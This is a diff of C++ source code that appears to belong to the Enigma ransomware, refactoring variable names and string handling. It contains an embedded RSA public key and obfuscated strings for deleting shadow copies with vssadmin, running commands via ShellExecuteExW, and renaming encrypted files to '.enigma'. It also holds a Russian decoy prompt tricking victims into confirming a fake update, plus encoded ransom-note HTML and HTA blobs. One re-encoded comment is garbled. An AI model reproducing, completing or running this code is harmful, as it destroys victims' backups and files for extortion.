@@ -22,56 +22,60 @@ const unsigned char kRsaPublicKey[] =
   0x82, 0xD6, 0x1A, 0xA2
 };
 
+std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
 
-static const char secondAlphabet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ";
+static const char second_alphabet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ";
 static wchar_t rsa_hash_wchar[10];
 static char rsa_hash[19]; //will be used as wchar_t in enigma_crypt1
 static const std::string user32{ InnerDecrypt("vv+%*v+C%%%CC(*Y*$*$") }; //user32.dll
 static const std::string shell32{ InnerDecrypt("v%*K*v*$*$%%%CC(*Y*$*$") }; //shell32.dll
 static const std::string shell_exec{ InnerDecrypt("v%*K*v*$*$Yv+K*v*%+v+Y*vYv+Kv+") };  //ShellExecuteExW
 static const std::string vssAdmCommand{ InnerDecrypt("+*+%+%*t*Y*;*N*(C(*v+K*vCx*Y*v*$*v+Y*vCx+%*K*t*Y*-+++%CxC-*t*$*$CxC-+t+v*N*v+Y") }; //vssadmin.exe delete shadows /all /quiet
-static const std::string falconStr{ InnerDecrypt("***t*$*%*-*(%NC(***t*$*%*-*(") }; //falcon9.falcon
+static const std::wstring falcon9_str{ converter.from_bytes(InnerDecrypt("***t*$*%*-*(%NC(***t*$*%*-*(")) }; //falcon9.falcon
 static const std::string aEnigma{ InnerDecrypt("YvY(YNY+Y;Yt") };//ENIGMA
-static const std::string aRsa{ InnerDecrypt("C(vCv%Yt") };//.RSA
+static const std::wstring enigma{ converter.from_bytes(InnerDecrypt("YvY(YNY+Y;Yt")) };//ENIGMA
+static const std::wstring dot_rsa{ converter.from_bytes(InnerDecrypt("C(vCv%Yt")) };//.RSA
+static const std::wstring enigma_dot_rsa{ enigma + dot_rsa }; //ENIGMA.RSA
 static const std::string i_hate_c{ InnerDecrypt("*N*K*t+Y*v*%") };//ihatec
-static const std::string firstMark{ "[PATHTODECSTOPRSA]" }; //[PATHTODECSTOPRSA]
-static const std::string secondMark{ "[PATHTOTMPRSA]" };//[PATHTOTMPRSA]
-static const std::string htaMark{ InnerDecrypt("v,YKvYYtvYYvvKvYv;") }; //[HTATEXT]
-static const std::string html_file_name{ InnerDecrypt("*v*(*N*+*;*tv-*v*(*%+CC(*K+Y*;*$") }; //enigma_encr.html
+static const std::string desktop_mark{ "[PATHTODECSTOPRSA]" }; //[PATHTODECSTOPRSA]
+static const std::string temp_mark{ "[PATHTOTMPRSA]" };//[PATHTOTMPRSA]
+static const std::string hta_mark{ InnerDecrypt("v,YKvYYtvYYvvKvYv;") }; //[HTATEXT]
+static const std::wstring html_file_name{ converter.from_bytes(InnerDecrypt("*v*(*N*+*;*tv-*v*(*%+CC(*K+Y*;*$")) }; //enigma_encr.html
 static const std::string kernel32{ InnerDecrypt("*,*v+C*(*v*$%%%CC(*Y*$*$") }; //kernel32.dll
 static const std::string js_file_name{ InnerDecrypt("*v*(*N*+*;*tC(*K+Y*t") };//enigma.hta
 static const std::string mark_737{ "737" }; //Crypto salt
-static const std::string decoyMessage1{ InnerDecrypt("$C-,Cx-%-t(-(v-K(;((Cx(((t(;(((C(,(v(;-,C(Cx;+-C(((t-,Cx-t((-v-x(x(;(K-C-$Cx(;(x(*($(K-C(vCx(Y(x") }; //Вы успешно обновлены. Чтобы сохранить нажмите да
+static const std::string decoy_message{ InnerDecrypt("$C-,Cx-%-t(-(v-K(;((Cx(((t(;(((C(,(v(;-,C(Cx;+-C(((t-,Cx-t((-v-x(x(;(K-C-$Cx(;(x(*($(K-C(vCx(Y(x") }; //Р’С‹ СѓСЃРїРµС€РЅРѕ РѕР±РЅРѕРІР»РµРЅС‹. Р§С‚РѕР±С‹ СЃРѕС…СЂР°РЅРёС‚СЊ РЅР°Р¶РјРёС‚Рµ РґР°
 static const std::string workstatistic_file_name = ""; //URI to workstatistic
 static const std::string work_statistic{ InnerDecrypt("++*-+C*,+%+Y*t+Y*N+%+Y*N*%C(*Y*t+Y") }; //workstatistic.dat
 static const std::string dot_enigma{ InnerDecrypt("C(*v*(*N*+*;*t") }; // .enigma
-static const int chunkSize = 40; //used in encryption
-static std::string htmlBody{ base64_decode(InnerDecrypt("vxY+*K%x*Cv+++C,Y%*NYt*+vxY+*K*$vNv+vtC,Y%*NYt*+YNY%Yt%K*tYKvC*KY-*;Y*++*%Y++K+xvN%CY*%x*tv+%N+vYNYv*$YYvY%x%Y%NYN*;vm*K*Y*;*$*m*C%C%Y+v*tv+Y(+*YN*NYCY%vY%tYmYvvCv*YN*+vxv%Yt*N*C*;%N+vvmv%YN*+vt%xY*vtv*Yv*$vxvY*NYt%NYNY%YmY-*C+NYN*+vt%x%NY-v*Yvv*vNv*Yv%tY*vY*$vv*+vxv%Yt*Nv+v+v*+mYN*NYCYmvY*,%vY*vv*,Ymvxvv*,vCY*vv*NYt%NYNY%YmY-*C+NYN*+vYvvY*vNv%vv%tYmv+*,v*Y%v*v*vCvvvY%x%Y*+vxv%Yt*NvY*;%K*NYNYv%tYmvY*,*$Y(v%v*+xY*vt*$v*vvv*Yv%NY-YNYY%x*+YN*,%v+*YN*NYCY-vtv*vmYmvC%xY*Y%vYYvvv*+vxv%Yt*Nv+v+v*+mYN*NYCvYvt%tYmvxvYYv++*+vxv%Yt*NvY*;%K*NYNY*Y(YYvv*,%NY;vYYvvmY;vtv*vt*+vxv%Yt*NvY*;%K*NYNY*Y(Y*vYYvv*YYv*Yv*$vxvY*NYt%NYNY%YmvmvmvKY;*NYNY*Y(YNvY%t*YYmvY*$vCYCvv%x+YY%vtv*YN*+vxv%Yt*Nv+v+v*+mYN*NYCvYv%vv%vYKvYYvv*YmvY*$Y(vvvtvv%vYYvCv%Yt%NYNY%YmvmvmvKY;*NYNY*Y(vmvv%x%tY*vY*$vv*+vxv%Yt*Nv+v+v*+mYN*N%KC,Y%*NYt*+YNY%Yt*+vxYKY(%x*vv++K*$vx*;Ym+*vmYK*$%+vN%%v*+N*%%C%N+NY-*;vC*$vm*;Y*%t*CYKvt%+vN*;Y**m*t%C*Y+N*C%%v*+vvmY%%t*m*C%C+K+**%*m*-*mvCvY*YY*Y(%xvv%%Y-%C%t*K*%*;*Y+x*C*m*-++Y-%Cvm+**C*(vt+Yvm*;Y*+Y*tv++K%vY-*NYmYNvmv++K%CvmvKvC+xvN%CY*Y-vmvKv**$Y$vv+K+xvm%C*K%xYN*N++*Nv%Y+v*+%*Y*;v*%x*tv+Y(*KYNYv%v*$*Yv+vv*+vYY+*$*(*tYKvt*NY$Y%YmYNvmv++K%CvmvKvC+xvN%CYv*+vY*;v*%tvmv%YN+%v%Y+v*+%*Y*;v*%x*tv+Y(*KY$YvY*+N*tv+Y*+%Y$YKY(*K*C*(Y;+Y*%%Cv*+N*tv+vN%+*YY+v*%Y*YY%%t*K*CY+*$*(*C*m+x*mvmv+%v%xvmvKYN%+Y$*(vm*K*YvKY(%x*vv++K*$*v%C%t*K*%*;*Y+x*C*m*-+KY;YKYC%YY-%C*K*$*tv+*Y*-*YYY*-%tY;*mYC++*vYY+Y%%*tv+vC%x*tYY*-+KY;vYYt++*%YK*K%NY$*(Y(*m*v%C%t*K*%*;*Y+x*C*m*-+KY;YKYC%YYNYYYv%tY;YKYC%YY-%Cvm+**C*(vt+Y*%%C*$%*vmvY*-%xY;YKYC%YY-%%*Y+xvmYKvC*-Y-*m*,++Y;YKYC%YY-%%YC*KvmY+vC+x*C*;*%%*Y;*mYC++*vYY+Y*NvNv+Y(+Cvm%%Ym+**Yv+%v*,Y$v+Y(+**CY+%N+NY-*NY;%%vNvY*Y*KY(%CYv%+vN%C%N+%*C%%YN%*YN%xvmY+Y(YvY;%xvt+m+Y*NvNv+Y(+Cvm%%Ym+**Yv+%v*,Y$v+*$+YvNv+*Y*$Y-*(v*+N*CY%*K*,vNvKvC*KY-*;*$+YvNv+*Y*$Y$%%YC+vvm+m+Y*NvNvKY(*$Y(*mvt+%*tv*vmY%vY%tYm%%Y;Yv+YYKvm%C%NYCvtvvY*YCvY*$Y(v**tYvv*v*vm%xY*YCvtvvY*v*vtvvY*YCvtvvvmYYvtv**$YCvtvvY*YYvY*;Ym%vvN*;+KYCvtvvY*YCv%*mYC+%vCv*Y*v+vv*mvt+N*Cv**KY(*%%tY*+CvtvvY*YC*v*,vCY(v%Y%+YvYY$+mvN%vvYvYvmv+vtv+%N*$vtv+*YYKvCY*Y*Y+v%v**%+*Y(Y*Y*vCvtv*Ym*N*Y%CY*Y+Y,%xYN+mY,%tY(vtvC%xY*+*Y-Y+Ym+%vm%xY*YCvtvvY*YCvCv++KY+v*Y++YvY*Yv*Y*+Yvt%xY;+x**v%%v*N*%*;*$*$vm*;+K%v*v%%YC+**%%C*$%x*tv+%N+vY-*;Y**N*%%C%N+%*YvKvC*$Y-%C+K*$vm*(vt%*Y(vYYC++*vYY+Y%%*tv+vC%x*tYY*-%xY-YYYC++*vYK%x+vvmY+v*%xvNv+*$+%vmv+vC%+vmY+*$+m*%Y++K*K*vvY+x+x*C*;+K+x*C*;vv+YvN*;+K+*vN%C+%%+*Cv+Y*+Nvm%C*$+vY$v++K*$vm*(vt%*Y(vYY;++*%YK*+%+*Y%C*$*,*YY+*+%*Y(*mvN++*%YK*K%NY$*;Ym%x*tvK+Y*NvNv+Y(+Cvm%%Ym+**Yv+%v*,Y$v+Y(+**CY+%N+NY-*NY(YvvC*,vCY+vCYvvN%+vN%C%N+%*C%%YN%*YN+mvv%tY(vY+Y*;*C%C%v%xY$vKY(+x*v*;vv%*Y;*m*K++*vYY+Y++vNv+vC*,*tv+%v*(Y-*mYv++*%YK*K%N*tYKYm%+*Y%C*$*,*YY+*+%*Y-vYYt*$YmvK%x+v*%%CY(*$vmYK+Y+YvNvKYm*(*tv+%Y+Y*YY+%N++Y-*mYv%t*%YK*+%+*YY+v*%Y*YY%%t*K*CY+*$*(*C*m+x*mvmv+%v%xvmvKYN%+vm*;%N+v*YY%%t+m*tvK+x*$Y-*mYN%%*%YK*+%+*tY+v*+xvm%C*K%xY-*mYN+NY;YKYC%YY-%%YC*KvmY+vC+x*C*;*%%*Y;*mYC++*vYY+Y*NvNv+Y(+Cvm%%Ym+**Yv+%v*,Y$v+Y(+**CY+%N+NY-*NY;%CvNvYvm*KY(*;Yv%+*CY+*$+vvmv%%t*-vmv+*$*(*tYKvt%*Y;v%%Y%tY-%CY(+**CY+%N+NY-*NY(Y*vtvvv*YCvCvvYv%+vN*;Y**m*t%C*Y+N*C%%v*+vvmY%%t+x*Cv+Y**(vmvY+x%t*%*;++*-vmY+Y*%xvNvY+x+x*Cv+Y**(vmv%%N++*C*;*%%+vN*;Y*+mvmvYvN%xY$Y+*$v+vt*,%Nv%*Y+mYCY$vC%C*Y+*vtvvY*YCvtvv%vvYv*v+*KY*v*v+*YYCvtvvY*YCv*vvY*YCvtvvY*Y+vt%xY*vmvtvvY*YCvt%x%v*N*vv+Ym+%vtvvY*YCvtvv*-++*CYvv*vCv**$YN%xY;*;%tvNvYvKY(vC*t%xY*YCvtvK+xYvvYvv*++Cvv+N%K%CY-vv%x%Cv**,Y*+*vmvvY**(vC%xvCvCvC*,*$vKY$+mvCvCvvvvY*v%vN*(*Y*KvC*N+YY%Y;+N+YvYvvYv*YYC*C+m*K*N*CY+*YYCvtvvY*YCvtvvv*+%vC*$vC+Cvv%%v*vC*CvvY(YYY,vK%t*;*C%%Ym+Y*v%CvC+x*%%%YC+%vNvK*,%**tv+%v+%*tv+%v*$**v%%v*,vN*(v*%x*YYK+Y+YvNvKYm*(*tv+%Y+Y*CY+v**;*YYY*-+N*%YK*+%+vm*;%N+v*YY%%t+m*tvK+x*$Y-*mYv%C*%YK*+%+vm*;%N+v*YY%%t%%vmv+*$*(*tYKvt%*Y(vYYt++Y-%CYm+**%*;vC*$*%*m+x+v*C%C%v*$Y-%CYm*KvN%C+Y*(*%*;%N%t*C*;vt+YvN%C%N+%*C%%YN%*YN+m*$*;Y-v+vN%vvm*m+Y*m*C%C+K+**%*m*-*mvCvvv*Y*Y-%CY(%t*%*(Y(+**%*m+x++*C%C*$+v*YY+v*+N**v%%v*;*C%C%N%xvmvKYm%+*YY+v*%Y*YY%%t*K*CY+*$*(*C*m+x+%vmv+vm%xY-%%YC+**%%C*$%x*tv+%N+vY-*(Ym*$*CY+Y*%x*tvKvm*$Y-%%*Y+xvmYKvC*-Y-*mvN++Y;YKYC%YY-%C%t*K*%*;*Y+x*C*m*-+N*%YK*+*+Y;*(YC%YYNYYYm++*vY%Yt%xY(vKYC%YY-%C*K*$*tv+*Y*-*YYY*-+KY(*(YC%YY-%Cvm+**C*(vt+Y*%%C*$%*vmvY*-+KY(vKYC%YY-%CYm*KvN%C+Y*(*%*;%N%t*C*;vt+YvN%C%N+%*C%%YN%*YN%xY(Y+vt%xvmYYvC*m+Y*m*C%C+K+**%*m*-*mY(YYvt%xY-%%YC*KvmY+vC+x*C*;*%%*Y(*(YC%Y**v%%v*;*C*;+K%+vm*;%N+v*YY%%t+m*tvK+x*$Y-*mYN+K*%YK*K%NY%*NYt*+YNY%Yt*+YNYY+++**%%%vC%v*CY+vvC,Y%*NYt*+YNY%Yt*+YNYY+K+YvmvKvC*KYNY+*K%x*YYKYt+YvmvKY*%t*tvKvN%NYN*,Y(+**C*(vC*$*C*(vt+Yv*YK*$++vmv%YN*+vN%C%N+v*YY+v*+v*YYY%x*N*YY+v*%Y*YY%%N*-*YY+%t+%Y-%CY(*-vNvKYm+mvmvKvt%N*YvKvC*;Y$vY*+*NY$+m%YY,YNY%Yt*+YNY%Yt*+vxYKvC+x*YY++K*$vx*m+++**YY+*$%x*CY+vvC,Y%*NYt*+YNY%Yt*+YNYY+K+mvN%%Ym+x*%YKvt*+*CY+Y*+vvm%%v**Kvm%Cvv%NYN*(vm*N*%%CY(+N*tvKYC%xYN*m%YY,YNY%Yt*+YNY%Yt*+YNY%YC+m*Yv+YN*+v*%C*$+vvmY+%N%%vK%x%N+v*CY+%N*KvmYt*-*+YNY%Yt*+YNY%Yt*+YNYK*Y+x*C*;vC+**Y+N%v+NvmvKY(+x*v*;v*vv*C+NYt+KY;*m*+++Y$YY*%+NY(vt*-*+YNY%Yt*+YNY%Yt*+YNYKY(*m*%*;v**$*C*$*Y+xvmYKvC*-YNYY%x*+vCY+%N*m*Yv+%t*$*C*(vt+vvvY+Y*+Nvmv+%v%xv*%C*$+vvmY+%N%%Y$*$Y(*m*%*;v**$*C*N%vYC*Y*;Y*+x*CY**Y+xvmYKvC*-Y%*NYt*+YNY%Yt*+YNY%Yt*+*%%CY(+Nvmv+v*+vv%Y+v*+xvm%C*K%xYNYY%x*+vCY+%N*m*Yv+%t*$*C*(vt+vvvY+Y*+Nvmv+%v%xv*%C*$+vvmY+%N%%Y$*$Y(*m*%*;v**$*C*N%vYC*Y*;Y*+x*CYv*K*$*tv+*Y*-*YYt*-*+YNY%Yt*+YNY%Yt*+YNYKYC+**%%x+K*$vm*(vt*+vxv%Yt*-*%%CY(+Nvmv+v*+vv*%C*$*,*YY+*+*+Y$v%Yt+KY;*m*+++Y,v%Yt+*YNYYYN*+Y%*NYt*+YNY%Yt*+YNY%Yt*+*%Y+%N+mv*Y+%N++YNYY%x*+Y,YKY(*m*%*;v**$*C*,*K*$*tv+*Y*-*YY%Yt+YYNYY*%+NY(v%*,*+Y$+NYt+NYNYt*-*+YNY%Yt*+YNY%Yt*+YNYK*Y+x*C*;vC+**Y+N%v+Y*C%%vm*$v*Y+%K*+*%Y+%N+mvYY+v**;*YY%++*+*%Y+%N+mv*Y+%N++YNYt*-*+YNY%Yt*+YNY%Yt*+YNY+v*+vvmY%YC+m*Yv+YN*+Y%*NYt*+YNY%Yt*+YNYY+++**%%CY(+N*tvKYC%xvx*+*-*+YNYY+++**tY+v**KvmYY%YY,YNY%Yt%KvN*;%N*,*vv%YC+mvN%%Ym+**CY+++%NYN*;%v+*YN*m%YY,v+%x*Kvvvtv*vCY*v+Y*vC*YY%*NYt*+vxY%%N*N*C%CvC%vvx*+*-%KY$%C*K%x*Cv+++C,\x00")) };
-static std::string htmlHead{ base64_decode(InnerDecrypt("vxY+*K%x*Cv+++C,Y%*NYt*+vxY+*K*$vNv+vtC,Y%*m+K+YvmvKvC*KYNY+Y(*-vNvKYm+mvmvKvt%NYN*$v*vvvC*N%x%YYN*m%YY,YNY%Yt%K*YY+*$%x*CY+vvC,vCv+%v+xvm%C%t*KvxY%%N%x*tvKvC+%vmvY%YY,YNY%Yt%KY$%C*K*$vNv+vtC,Y%*NYt*+vxY+Ym+*vmYK*,C,Y%*NYt*+v+%x*Kvvvtv*vCY*v+Y*vC*YY%*NYt*+vxY%%N*N*C%CvC%vvx*+*-*+YNYY+++**tYKvC+Y*CYY%Y%;\x00")) };
-static std::string htmlJS{ base64_decode(InnerDecrypt("vxY+*K%x*Cv+++C,Y%*NYt*+vxY+*K*$vNv+vtC,Y%*NYt*+YNY%Yt%K*tYKvC*KY-*;Y*++*%Y++K+xvN%CY*%x*tv+%N+vYNYv*$YYvY%x%Y%NYN*;vm*K*Y*;*$*m*C%C%Y+v*tv+Y(+*YN*NYCY%vY%tYmYvvCv*YN*+vxv%Yt*N*C*;%N+vvmv%YN*+vt%xY*vtv*Yv*$vxvY*NYt%NYNY%YmY-*C+NYN*+vt%x%NY-v*Yvv*vNv*Yv%tY*vY*$vv*+vxv%Yt*Nv+v+v*+mYN*NYCYmvY*,%vY*vv*,Ymvxvv*,vCY*vv*NYt%NYNY%YmY-*C+NYN*+vYvvY*vNv%vv%tYmv+*,v*Y%v*v*vCvvvY%x%Y*+vxv%Yt*NvY*;%K*NYNYv%tYmvY*,*$Y(v%v*+xY*vt*$v*vvv*Yv%NY-YNYY%x*+YN*,%v+*YN*NYCY-vtv*vmYmvC%xY*Y%vYYvvv*+vxv%Yt*Nv+v+v*+mYN*NYCvYvt%tYmvxvYYv++*+vxv%Yt*NvY*;%K*NYNY*Y(YYvv*,%NY;vYYvvmY;vtv*vt*+vxv%Yt*NvY*;%K*NYNY*Y(Y*vYYvv*YYv*Yv*$vxvY*NYt%NYNY%YmvmvmvKY;*NYNY*Y(YNvY%t*YYmvY*$vCYCvv%x+YY%vtv*YN*+vxv%Yt*Nv+v+v*+mYN*NYCvYv%vv%vYKvYYvv*YmvY*$Y(vvvtvv%vYYvCv%Yt%NYNY%YmvmvmvKY;*NYNY*Y(vmvv%x%tY*vY*$vv*+vxv%Yt*Nv+v+v*+mYN*N%KC,Y%*NYt*+YNY%Yt*+vxYKY(%x*vv++K*$vx*;Ym+*vmYK*$%+vN%%v*+N*%%C%N+NY-*;vC*$vm*;Y*%t*CYKvt%+vN*;Y**m*t%C*Y+N*C%%v*+vvmY%%t*m*C%C+K+**%*m*-*mvCvY*YY*Y(%xvv%%Y-%C%t*K*%*;*Y+x*C*m*-++Y-%Cvm+**C*(vt+Yvm*;Y*+Y*tv++K%vY-*NYmYNvmv++K%CvmvKvC+xvN%CY*Y-vmvKv**$Y$vv+K+xvm%C*K%xYN*N++*Nv%Y+v*+%*Y*;v*%x*tv+Y(*KYNYv%v*$*Yv+vv*+vYY+*$*(*tYKvt*NY$Y%YmYNvmv++K%CvmvKvC+xvN%CYv*+vY*;v*%tvmv%YN+%v%Y+v*+%*Y*;v*%x*tv+Y(*KY$YvY*+N*tv+Y*+%Y$YKY(*K*C*(Y;+Y*%%Cv*+N*tv+vN%+*YY+v*%Y*YY%%t*K*CY+*$*(*C*m+x*mvmv+%v%xvmvKYN%+Y$*(vm*K*YvKY(%x*vv++K*$*v%C%t*K*%*;*Y+x*C*m*-+KY;YKYC%YY-%C*K*$*tv+*Y*-*YYY*-%tY;*mYC++*vYY+Y%%*tv+vC%x*tYY*-+KY;vYYt++*%YK*K%NY$*(Y(*m*v%C%t*K*%*;*Y+x*C*m*-+KY;YKYC%YYNYYYv%tY;YKYC%YY-%Cvm+**C*(vt+Y*%%C*$%*vmvY*-%xY;YKYC%YY-%%*Y+xvmYKvC*-Y-*m*,++Y;YKYC%YY-%%YC*KvmY+vC+x*C*;*%%*Y;*mYC++*vYY+Y*NvNv+Y(+Cvm%%Ym+**Yv+%v*,Y$v+Y(+**CY+%N+NY-*NY;%%vNvY*Y*KY(%CYv%+vN%C%N+%*C%%YN%*YN%xvmY+Y(YvY;%xvt+m+Y*NvNv+Y(+Cvm%%Ym+**Yv+%v*,Y$v+*$+YvNv+*Y*$Y-*(v*+N*CY%*K*,vNvKvC*KY-*;*$+YvNv+*Y*$Y$%%YC+vvm+m+Y*NvNvKY(*$Y(*mvt+%*tv*vmY%vY%tYm%%Y;Yv+YYKvm%C%NYCvtvvY*YCvY*$Y(v**tYvv*v*vm%xY*YCvtvvY*v*vtvvY*YCvtvvvmYYvtv**$YCvtvvY*YYvY*;Ym%vvN*;+KYCvtvvY*YCv%*mYC+%vCv*Y*v+vv*mvt+N*Cv**KY(*%%tY*+CvtvvY*YC*v*,vCY(v%Y%+YvYY$+mvN%vvYvYvmv+vtv+%N*$vtv+*YYKvCY*Y*Y+v%v**%+*Y(Y*Y*vCvtv*Ym*N*Y%CY*Y+Y,%xYN+mY,%tY(vtvC%xY*+*Y-Y+Ym+%vm%xY*YCvtvvY*YCvCv++KY+v*Y++YvY*Yv*Y*+Yvt%xY;+x**v%%v*N*%*;*$*$vm*;+K%v*v%%YC+**%%C*$%x*tv+%N+vY-*;Y**N*%%C%N+%*YvKvC*$Y-%C+K*$vm*(vt%*Y(vYYC++*vYY+Y%%*tv+vC%x*tYY*-%xY-YYYC++*vYK%x+vvmY+v*%xvNv+*$+%vmv+vC%+vmY+*$+m*%Y++K*K*vvY+x+x*C*;+K+x*C*;vv+YvN*;+K+*vN%C+%%+*Cv+Y*+Nvm%C*$+vY$v++K*$vm*(vt%*Y(vYY;++*%YK*+%+*Y%C*$*,*YY+*+%*Y(*mvN++*%YK*K%NY$*;Ym%x*tvK+Y*NvNv+Y(+Cvm%%Ym+**Yv+%v*,Y$v+Y(+**CY+%N+NY-*NY(YvvC*,vCY+vCYvvN%+vN%C%N+%*C%%YN%*YN+mvv%tY(vY+Y*;*C%C%v%xY$vKY(+x*v*;vv%*Y;*m*K++*vYY+Y++vNv+vC*,*tv+%v*(Y-*mYv++*%YK*K%N*tYKYm%+*Y%C*$*,*YY+*+%*Y-vYYt*$YmvK%x+v*%%CY(*$vmYK+Y+YvNvKYm*(*tv+%Y+Y*YY+%N++Y-*mYv%t*%YK*+%+*YY+v*%Y*YY%%t*K*CY+*$*(*C*m+x*mvmv+%v%xvmvKYN%+vm*;%N+v*YY%%t+m*tvK+x*$Y-*mYN%%*%YK*+%+*tY+v*+xvm%C*K%xY-*mYN+NY;YKYC%YY-%%YC*KvmY+vC+x*C*;*%%*Y;*mYC++*vYY+Y*NvNv+Y(+Cvm%%Ym+**Yv+%v*,Y$v+Y(+**CY+%N+NY-*NY;%CvNvYvm*KY(*;Yv%+*CY+*$+vvmv%%t*-vmv+*$*(*tYKvt%*Y;v%%Y%tY-%CY(+**CY+%N+NY-*NY(Y*vtvvv*YCvCvvYv%+vN*;Y**m*t%C*Y+N*C%%v*+vvmY%%t+x*Cv+Y**(vmvY+x%t*%*;++*-vmY+Y*%xvNvY+x+x*Cv+Y**(vmv%%N++*C*;*%%+vN*;Y*+mvmvYvN%xY$Y+*$v+vt*,%Nv%*Y+mYCY$vC%C*Y+*vtvvY*YCvtvv%vvYv*v+*KY*v*v+*YYCvtvvY*YCv*vvY*YCvtvvY*Y+vt%xY*vmvtvvY*YCvt%x%v*N*vv+Ym+%vtvvY*YCvtvv*-++*CYvv*vCv**$YN%xY;*;%tvNvYvKY(vC*t%xY*YCvtvK+xYvvYvv*++Cvv+N%K%CY-vv%x%Cv**,Y*+*vmvvY**(vC%xvCvCvC*,*$vKY$+mvCvCvvvvY*v%vN*(*Y*KvC*N+YY%Y;+N+YvYvvYv*YYC*C+m*K*N*CY+*YYCvtvvY*YCvtvvv*+%vC*$vC+Cvv%%v*vC*CvvY(YYY,vK%t*;*C%%Ym+Y*v%CvC+x*%%%YC+%vNvK*,%**tv+%v+%*tv+%v*$**v%%v*,vN*(v*%x*YYK+Y+YvNvKYm*(*tv+%Y+Y*CY+v**;*YYY*-+N*%YK*+%+vm*;%N+v*YY%%t+m*tvK+x*$Y-*mYv%C*%YK*+%+vm*;%N+v*YY%%t%%vmv+*$*(*tYKvt%*Y(vYYt++Y-%CYm+**%*;vC*$*%*m+x+v*C%C%v*$Y-%CYm*KvN%C+Y*(*%*;%N%t*C*;vt+YvN%C%N+%*C%%YN%*YN+m*$*;Y-v+vN%vvm*m+Y*m*C%C+K+**%*m*-*mvCvvv*Y*Y-%CY(%t*%*(Y(+**%*m+x++*C%C*$+v*YY+v*+N**v%%v*;*C%C%N%xvmvKYm%+*YY+v*%Y*YY%%t*K*CY+*$*(*C*m+x+%vmv+vm%xY-%%YC+**%%C*$%x*tv+%N+vY-*(Ym*$*CY+Y*%x*tvKvm*$Y-%%*Y+xvmYKvC*-Y-*mvN++Y;YKYC%YY-%C%t*K*%*;*Y+x*C*m*-+N*%YK*+*+Y;*(YC%YYNYYYm++*vY%Yt%xY(vKYC%YY-%C*K*$*tv+*Y*-*YYY*-+KY(*(YC%YY-%Cvm+**C*(vt+Y*%%C*$%*vmvY*-+KY(vKYC%YY-%CYm*KvN%C+Y*(*%*;%N%t*C*;vt+YvN%C%N+%*C%%YN%*YN%xY(Y+vt%xvmYYvC*m+Y*m*C%C+K+**%*m*-*mY(YYvt%xY-%%YC*KvmY+vC+x*C*;*%%*Y(*(YC%Y**v%%v*;*C*;+K%+vm*;%N+v*YY%%t+m*tvK+x*$Y-*mYN+K*%YK*K%NY%*NYt*+YNY%Yt*+YNYY+++**%%%vC%v*CY+vvC,Y%*NYt*+YNY%Yt*+YNYY+K+YvmvKvC*KYNY+*K%x*YYKYt+YvmvKY*%t*tvKvN%NYN*,Y(+**C*(vC*$*C*(vt+Yv*YK*$++vmv%YN*+vN%C%N+v*YY+v*+v*YYY%x*N*YY+v*%Y*YY%%N*-*YY+%t+%Y-%CY(*-vNvKYm+mvmvKvt%N*YvKvC*;Y$vY*+*NY$+m%YY,YNY%Yt*+YNY%Yt*+vxYKvC+x*YY++K*$vx*m+++**YY+*$%x*CY+vvC,Y%*NYt*+YNY%Yt*+YNYY+K+mvN%%Ym+x*%YKvt*+*CY+Y*+vvm%%v**Kvm%Cvv%NYN*(vm*N*%%CY(+N*tvKYC%xYN*m%YY,YNY%Yt*+YNY%Yt*+YNY%YC+m*Yv+YN*+v*%C*$+vvmY+%N%%vK%x%N+v*CY+%N*KvmYt*-*+YNY%Yt*+YNY%Yt*+YNYK*Y+x*C*;vC+**Y+N%v+NvmvKY(+x*v*;v*vv*C+NYt+KY;*m*+++Y$YY*%+NY(vt*-*+YNY%Yt*+YNY%Yt*+YNYKY(*m*%*;v**$*C*$*Y+xvmYKvC*-YNYY%x*+vCY+%N*m*Yv+%t*$*C*(vt+vvvY+Y*+Nvmv+%v%xv*%C*$+vvmY+%N%%Y$*$Y(*m*%*;v**$*C*N%vYC*Y*;Y*+x*CY**Y+xvmYKvC*-Y%*NYt*+YNY%Yt*+YNY%Yt*+*%%CY(+Nvmv+v*+vv%Y+v*+xvm%C*K%xYNYY%x*+vCY+%N*m*Yv+%t*$*C*(vt+vvvY+Y*+Nvmv+%v%xv*%C*$+vvmY+%N%%Y$*$Y(*m*%*;v**$*C*N%vYC*Y*;Y*+x*CYv*K*$*tv+*Y*-*YYt*-*+YNY%Yt*+YNY%Yt*+YNYKYC+**%%x+K*$vm*(vt*+vxv%Yt*-*%%CY(+Nvmv+v*+vv*%C*$*,*YY+*+*+Y$v%Yt+KY;*m*+++Y,v%Yt+*YNYYYN*+Y%*NYt*+YNY%Yt*+YNY%Yt*+*%Y+%N+mv*Y+%N++YNYY%x*+Y,YKY(*m*%*;v**$*C*,*K*$*tv+*Y*-*YY%Yt+YYNYY*%+NY(v%*,*+Y$+NYt+NYNYt*-*+YNY%Yt*+YNY%Yt*+YNYK*Y+x*C*;vC+**Y+N%v+Y*C%%vm*$v*Y+%K*+*%Y+%N+mvYY+v**;*YY%++*+*%Y+%N+mv*Y+%N++YNYt*-*+YNY%Yt*+YNY%Yt*+YNY+v*+vvmY%YC+m*Yv+YN*+Y%*NYt*+YNY%Yt*+YNYY+++**%%CY(+N*tvKYC%xvx*+*-*+YNYY+++**tY+v**KvmYY%YY,YNY%Yt%KvN*;%N*,*vv%YC+mvN%%Ym+**CY+++%NYN*;%v+*YN*m%YY,v+%x*Kvvvtv*vCY*v+Y*vC*YY%*NYt*+vxY%%N*N*C%CvC%vvx*+*-%KY$%C*K%x*Cv+++C,\x00")) };
+static const int kChunkSize = 40; //used in encryption
